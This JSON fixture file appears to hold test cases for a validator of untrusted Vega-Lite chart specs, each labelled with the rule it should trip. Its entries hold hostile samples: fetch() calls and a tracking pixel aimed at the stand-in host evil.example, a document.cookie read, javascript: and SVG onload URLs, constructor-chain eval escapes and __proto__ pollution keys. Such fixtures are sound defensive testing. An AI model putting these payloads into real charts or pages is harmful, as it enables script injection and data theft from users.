[
  {"name": "data url absolute", "rules": ["url_data"],
   "spec": {"data": {"url": "https://evil.example/steal.csv"}, "mark": "point"}},
  {"name": "data url relative", "rules": ["url_data"],
   "spec": {"data": {"url": "data/cars.json"}, "mark": "point"}},
  {"name": "data url in layer", "rules": ["url_data"],
   "spec": {"data": {"name": "d"}, "layer": [{"mark": "line"}, {"data": {"url": "//evil.example/x.csv"}, "mark": "point"}]}},
  {"name": "lookup from url", "rules": ["url_data"],
   "spec": {"data": {"name": "d"}, "mark": "point", "transform": [{"lookup": "id", "from": {"data": {"url": "https://evil.example/ids.csv"}, "key": "id", "fields": ["x"]}}]}},
  {"name": "url data with format", "rules": ["url_data"],
   "spec": {"data": {"url": "https://evil.example/topo.json", "format": {"type": "topojson", "feature": "x"}}, "mark": "geoshape"}},
  {"name": "image mark", "rules": ["external_image"],
   "spec": {"data": {"name": "d"}, "mark": "image", "encoding": {"url": {"field": "img"}}}},
  {"name": "image mark object", "rules": ["external_image"],
   "spec": {"data": {"name": "d"}, "mark": {"type": "image", "width": 10}}},
  {"name": "url channel value", "rules": ["external_image"],
   "spec": {"data": {"name": "d"}, "mark": "point", "encoding": {"url": {"value": "https://evil.example/pixel.gif?leak=1"}}}},
  {"name": "href encoding", "rules": ["href"],
   "spec": {"data": {"name": "d"}, "mark": "point", "encoding": {"href": {"field": "link", "type": "nominal"}}}},
  {"name": "href mark property", "rules": ["href"],
   "spec": {"data": {"name": "d"}, "mark": {"type": "point", "href": "https://evil.example/"}}},
  {"name": "href in config", "rules": ["href"],
   "spec": {"data": {"name": "d"}, "mark": "point", "config": {"mark": {"href": "javascript:alert(1)"}}}},
  {"name": "constructor chain in calculate", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "transform": [{"calculate": "datum.constructor.constructor('alert(1)')()", "as": "q"}]}},
  {"name": "proto in string member", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "transform": [{"calculate": "datum['__proto__']", "as": "q"}]}},
  {"name": "assembled member name", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "transform": [{"calculate": "datum['con' + 'structor']", "as": "q"}]}},
  {"name": "unicode escape in string", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "transform": [{"calculate": "datum['\\u0063onstructor']", "as": "q"}]}},
  {"name": "window assignment in filter", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "transform": [{"filter": "window.location = 'https://evil.example'"}]}},
  {"name": "fetch in param expr", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "params": [{"name": "p", "expr": "fetch('https://evil.example/' + 1)"}]}},
  {"name": "document.cookie in labelExpr", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "encoding": {"x": {"field": "a", "type": "quantitative", "axis": {"labelExpr": "document.cookie"}}}}},
  {"name": "eval in condition test", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "encoding": {"color": {"condition": {"test": "eval('1')", "value": "red"}, "value": "blue"}}}},
  {"name": "indirect eval", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "transform": [{"filter": "(0, eval)('1')"}]}},
  {"name": "method call", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "transform": [{"calculate": "datum.name.toString()", "as": "q"}]}},
  {"name": "template literal", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "transform": [{"calculate": "`${datum.x}`", "as": "q"}]}},
  {"name": "regex literal", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "transform": [{"filter": "/a/.test(datum.x)"}]}},
  {"name": "this access", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "transform": [{"calculate": "this.x", "as": "q"}]}},
  {"name": "unknown function", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "transform": [{"calculate": "vlSelectionTest('x', datum)", "as": "q"}]}},
  {"name": "event view", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "params": [{"name": "p", "expr": "event.view.name"}]}},
  {"name": "expression in event stream filter", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "params": [{"name": "s", "select": {"type": "point", "on": "click[eval('1')]"}}]}},
  {"name": "expression in logical composition", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "transform": [{"filter": {"and": ["datum.x > 1", "fetch('x')"]}}]}},
  {"name": "statement separator", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "transform": [{"filter": "1; 2"}]}},
  {"name": "custom format type", "rules": ["format_type"],
   "spec": {"data": {"name": "d"}, "mark": "text", "encoding": {"text": {"field": "a", "formatType": "pwn"}}}},
  {"name": "custom format types config", "rules": ["format_type"],
   "spec": {"data": {"name": "d"}, "mark": "point", "config": {"customFormatTypes": true}}},
  {"name": "proto key", "rules": ["proto_key"],
   "spec": {"data": {"name": "d"}, "mark": "point", "encoding": {"__proto__": {"polluted": true}}}},
  {"name": "constructor key", "rules": ["proto_key"],
   "spec": {"data": {"name": "d"}, "mark": "point", "usermeta": {"constructor": {"prototype": 1}}}},
  {"name": "proto field path", "rules": ["proto_key"],
   "spec": {"data": {"name": "d"}, "mark": "point", "transform": [{"calculate": "1", "as": "__proto__.polluted"}]}},
  {"name": "proto field in encoding", "rules": ["proto_key"],
   "spec": {"data": {"name": "d"}, "mark": "point", "encoding": {"x": {"field": "a.constructor", "type": "quantitative"}}}},
  {"name": "css url fill", "rules": ["css_url"],
   "spec": {"data": {"name": "d"}, "mark": {"type": "point", "fill": "url(https://evil.example/#g)"}}},
  {"name": "css url background", "rules": ["css_url"],
   "spec": {"data": {"name": "d"}, "mark": "point", "background": "URL( 'https://evil.example/bg.png' )"}},
  {"name": "javascript url in usermeta", "rules": ["script_url"],
   "spec": {"data": {"name": "d"}, "mark": "point", "usermeta": {"link": "javascript:alert(document.domain)"}}},
  {"name": "obfuscated javascript url", "rules": ["script_url"],
   "spec": {"data": {"name": "d"}, "mark": "point", "description": " jav\tascript:alert(1)"}},
  {"name": "data html url", "rules": ["script_url"],
   "spec": {"data": {"name": "d"}, "mark": "point", "usermeta": {"x": "data:text/html;base64,PHNjcmlwdD4="}}},
  {"name": "svg data url", "rules": ["script_url"],
   "spec": {"data": {"name": "d"}, "mark": "point", "usermeta": {"x": "data:image/svg+xml,<svg onload=alert(1)>"}}},
  {"name": "foreign schema", "rules": ["schema"],
   "spec": {"$schema": "https://evil.example/vega-lite.json", "data": {"name": "d"}, "mark": "point"}},
  {"name": "unknown mark", "rules": ["schema"],
   "spec": {"data": {"name": "d"}, "mark": "iframe"}},
  {"name": "unknown top-level key", "rules": ["schema"],
   "spec": {"data": {"name": "d"}, "mark": "point", "loader": {"baseURL": "https://evil.example/"}}},
  {"name": "select toggle expression", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "encoding": {"x": {"field": "a", "type": "quantitative"}}, "params": [{"name": "p", "select": {"type": "point", "toggle": "window.fetch('https://evil/'+datum.a)"}}]}},
  {"name": "select toggle global call", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "encoding": {"x": {"field": "a", "type": "quantitative"}}, "params": [{"name": "p", "select": {"type": "point", "toggle": "fetch('https://evil')"}}]}},
  {"name": "bind legend event filter", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "encoding": {"x": {"field": "a", "type": "quantitative"}}, "params": [{"name": "p", "select": {"type": "point", "fields": ["a"]}, "bind": {"legend": "click[window.fetch('https://evil')]"}}]}},
  {"name": "bind legend event object filter", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "encoding": {"x": {"field": "a", "type": "quantitative"}}, "params": [{"name": "p", "select": {"type": "point", "fields": ["a"]}, "bind": {"legend": {"type": "click", "filter": "window.fetch('https://evil')"}}}]}},
  {"name": "computed event view access", "rules": ["expression"],
   "spec": {"data": {"name": "d"}, "mark": "point", "encoding": {"x": {"field": "a", "type": "quantitative"}}, "transform": [{"calculate": "event['view']", "as": "z"}]}},
  {"name": "usermeta embed options", "rules": ["config"],
   "spec": {"data": {"name": "d"}, "mark": "point", "encoding": {"x": {"field": "a", "type": "quantitative"}}, "usermeta": {"embedOptions": {"actions": true, "editorUrl": "https://evil.example", "ast": false}}}}
]
